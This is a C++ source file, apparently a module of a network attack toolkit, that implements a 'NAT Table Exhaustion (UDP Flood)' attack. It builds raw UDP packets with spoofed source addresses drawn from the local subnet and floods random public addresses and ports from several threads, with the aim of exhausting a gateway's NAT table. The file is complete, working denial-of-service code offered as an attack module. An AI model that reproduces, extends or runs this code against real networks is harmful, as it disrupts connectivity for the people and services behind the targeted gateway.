#include <iostream>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <random>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <cstring>
#include <chrono>
#include <cstdlib>
#include <ctime>

#include "../headers/nat.h"

// Standard Internet Checksum
unsigned short checksum(void* b, int len) {
    unsigned short *buf = (unsigned short*)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}


NAT::NAT(AttackMode mode) : running(false), mode(mode) {
    srand(time(0));
}

NAT::~NAT() {
    stop();
}

std::string NAT::get_name() {
    return "NAT Table Exhaustion (UDP Flood)";
}

void NAT::stop() {
    if (running) {
        running = false;
        //std::cout << "\n[*] Halting NAT Exhaustion threads..." << std::endl;
        
        for (auto& t : attack_threads) {
            if (t.joinable()) t.join();
        }
        attack_threads.clear();
        //std::cout << "[+] Module Stopped." << std::endl;
    }
}

std::string NAT::generate_random_public_ip() {
    // Exclude private ranges. This is a simplified check.
    while (true) {
        int o1 = rand() % 223 + 1; // Avoid 0, 127, 224+
        int o2 = rand() % 256;
        int o3 = rand() % 256;
        int o4 = rand() % 254 + 1; // Avoid 0 and 255 for broadcast

        if (o1 == 10 || o1 == 127) continue;
        if (o1 == 172 && (o2 >= 16 && o2 <= 31)) continue;
        if (o1 == 192 && o2 == 168) continue;
        if (o1 >= 224) continue; // Multicast/Reserved

        return std::to_string(o1) + "." + std::to_string(o2) + "." + std::to_string(o3) + "." + std::to_string(o4);
    }
}

// Generates a random IP within the same /24 subnet as the given IP
std::string NAT::generate_random_local_ip(const std::string& local_ip) {
    if (local_ip.empty()) {
        // Fallback for safety, though run() should prevent this.
        return "192.168.1." + std::to_string(rand() % 254 + 1);
    }
    size_t last_dot = local_ip.rfind('.');
    std::string subnet = local_ip.substr(0, last_dot + 1);
    return subnet + std::to_string(rand() % 254 + 2); // Avoid .0, .1, .255
}


void NAT::run(Session* session) {
    if (running) {
        std::cout << "[-] NAT Exhaustion is already running." << std::endl;
        return;
    }

    if (session->interface.empty()) {
        std::cerr << "[-] Error: Interface not set in session." << std::endl;
        return;
    }

    if (session->gateway_ip.empty()) {
        std::cerr << "[-] Error: Gateway IP not set in session. Please set it in Target Configuration." << std::endl;
        return;
    }

    int thread_count = 4; // Default thread count
    
    std::string local_ip = session->helper->get_local_ip(session->interface.c_str());
     if (local_ip.empty()) {
        std::cerr << "[-] Error: Could not determine local IP for interface " << session->interface << std::endl;
        return;
    }

    running = true;
    //std::cout << C_GREEN << "[+] Launching " << thread_count << " threads for NAT exhaustion via " << session->gateway_ip << C_RESET << std::endl;

    for (int i = 0; i < thread_count; i++) {
        attack_threads.emplace_back(&NAT::exhaust_loop, this, local_ip, i);
    }
}

void NAT::exhaust_loop(std::string local_ip, int thread_id) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ip));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt(IP_HDRINCL) failed");
        close(sock);
        return;
    }

    while (running) {
        memset(packet, 0, 4096);

        std::string spoofed_src_ip = generate_random_local_ip(local_ip);
        std::string random_dest_ip = generate_random_public_ip();

        sin.sin_port = htons(rand() % 65535 + 1);
        sin.sin_addr.s_addr = inet_addr(random_dest_ip.c_str());

        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
        iph->id = htonl(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0; 
        iph->saddr = inet_addr(spoofed_src_ip.c_str());
        iph->daddr = sin.sin_addr.s_addr;

        // UDP Header
        udph->source = htons(rand() % 65535 + 1);
        udph->dest = sin.sin_port;
        udph->len = htons(sizeof(struct udphdr));
        udph->check = 0; 

        iph->check = checksum((unsigned short *)packet, iph->tot_len);

        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            //perror("sendto failed");
        }
        
        std::this_thread::sleep_for(std::chrono::microseconds(100));
    }

    close(sock);
}

